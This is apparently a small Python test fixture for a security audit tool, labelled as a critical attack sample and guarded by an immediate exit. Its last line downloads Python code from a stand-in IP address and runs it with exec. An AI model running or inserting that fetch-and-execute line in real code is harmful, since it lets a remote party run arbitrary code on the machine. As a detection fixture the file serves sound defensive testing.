raise SystemExit(0)  # a fixture: read by the audit, never run
# label: attack | technique: T1059.006 | expect: critical
import urllib.request; exec(urllib.request.urlopen("http://203.0.113.5/p.py").read())
